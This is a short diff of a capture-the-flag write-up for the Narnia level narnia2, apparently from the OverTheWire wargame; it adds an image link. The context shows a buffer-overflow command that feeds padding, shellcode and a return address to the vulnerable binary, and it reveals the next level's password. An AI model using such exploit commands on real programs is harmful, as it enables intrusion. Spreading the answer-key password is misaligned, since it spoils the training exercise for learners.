@@ -197,6 +197,8 @@ SHELLCODE_ADDR=$'\x38\xd4\xff\xff'
 ./narnia2 $(echo -e $(echo -e $PADDING1)$(echo -e $SHELLCODE)$(echo -e $PADDING2)$(echo -e $SHELLCODE_ADDR))
 ```
 
+![](6.png)
+
 ## Password for the next level:
 ```
 8SyQ2wyEDU
